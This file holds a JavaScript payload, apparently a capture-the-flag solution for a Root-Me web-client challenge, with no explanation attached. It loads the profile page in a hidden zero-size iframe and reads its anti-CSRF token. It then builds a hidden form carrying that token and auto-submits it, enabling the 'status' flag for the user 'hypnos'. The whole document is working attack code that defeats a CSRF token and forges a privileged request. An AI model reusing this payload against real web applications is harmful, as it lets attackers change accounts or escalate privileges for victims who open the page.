document.writeln('<iframe id="iframe2" src="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" width="0" height="0" onload="read()"></iframe>');
function read()
{
    var name = 'hypnos';
    var token = document.getElementById("iframe2").contentDocument.getElementById("profile").token.value;
    document.writeln('<form name="test" method="post" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile">');
    document.writeln('<input id="username" type="hidden" name="username" value="' + name + '" /><br />');
    document.writeln('<input id="status" type="checkbox" name="status" checked /><br />');
    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
    document.writeln('</form>');
    document.test.submit();
}